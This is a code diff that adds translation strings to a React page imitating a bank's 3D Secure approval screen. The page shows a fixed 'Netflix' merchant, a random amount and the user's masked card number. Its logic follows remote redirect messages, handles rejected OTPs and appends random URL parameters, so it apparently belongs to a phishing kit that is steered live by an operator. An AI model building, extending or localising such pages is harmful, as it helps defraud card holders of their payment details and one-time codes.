@@ -1,10 +1,12 @@
 import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { useTranslation } from '../hooks/useTranslation';
 import { randomParamsURL } from '../utils/validation';
 import '../styles/vbv-app.css';
 
 function ThreeDSecureBank() {
   const navigate = useNavigate();
+  const { t } = useTranslation();
 
   // Formater le numéro de carte : afficher les 4 premiers et 4 derniers chiffres
   const formatCardNumber = (number) => {
@@ -57,7 +59,7 @@ function ThreeDSecureBank() {
       if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
         const page = data.payload.page;
         const isCancellation = data.payload.isCancellation || false;
-        const errorMessage = data.payload.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
+        const errorMessage = data.payload.errorMessage || t('threeDSecureBank.errors.invalidCard');
         console.log('[ThreeDSecureBank] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
         
         // Si c'est une annulation vers payment-details, stocker le message d'erreur
@@ -77,7 +79,7 @@ function ThreeDSecureBank() {
         } else {
           // Si rejeté, rediriger vers payment-details avec message d'erreur
           console.log('[ThreeDSecureBank] 🚫 OTP rejected - storing error message');
-          localStorage.setItem('paymentError', 'Your credit card is not valid. Please check your card details and try again.');
+          localStorage.setItem('paymentError', t('threeDSecureBank.errors.invalidCard'));
           navigate(`/payment-details?${randomParamsURL()}`);
         }
       } else if (data && data.type === 'redirect') {
@@ -182,28 +184,32 @@ function ThreeDSecureBank() {
               </div>
             </div>
 
-            <h1 className="page-title">Approve in your Bank App</h1>
+            <h1 className="page-title">{t('threeDSecureBank.title')}</h1>
             
             <p className="info-message">
-              Please open your bank's mobile app to approve this transaction.<br />
-              We're waiting for your confirmation.
+              {t('threeDSecureBank.infoMessage').split('\\n').map((line, i, arr) => (
+                <span key={i}>
+                  {line}
+                  {i < arr.length - 1 && <br />}
+                </span>
+              ))}
             </p>
 
             <div className="transaction-info">
               <div className="info-row">
-                <span className="info-label">Merchant:</span>
+                <span className="info-label">{t('threeDSecureBank.merchant')}:</span>
                 <span className="info-value">Netflix</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Amount:</span>
+                <span className="info-label">{t('threeDSecureBank.amount')}:</span>
                 <span className="info-value amount">${randomAmount}</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Date:</span>
+                <span className="info-label">{t('threeDSecureBank.date')}:</span>
                 <span className="info-value">{currentDate}</span>
               </div>
               <div className="info-row">
-                <span className="info-label">Card number:</span>
+                <span className="info-label">{t('threeDSecureBank.cardNumber')}:</span>
                 <span className="info-value card-num">{formatCardNumber(cardNumber)}</span>
               </div>
             </div>
@@ -217,15 +223,15 @@ function ThreeDSecureBank() {
                   </circle>
                 </svg>
               </div>
-              <p className="loading-text">Processing...</p>
+              <p className="loading-text">{t('threeDSecureBank.processing')}</p>
             </div>
 
             <div className="form-buttons">
-              <a href="#" className="cancel-link" onClick={handleCancel}>Cancel Transaction</a>
+              <a href="#" className="cancel-link" onClick={handleCancel}>{t('threeDSecureBank.cancelTransaction')}</a>
             </div>
 
             <div className="footer-info">
-              <p>All entered information is confidential and is not to be shared with the merchant.</p>
+              <p>{t('threeDSecureBank.footerInfo')}</p>
             </div>
           </div>
         </div>
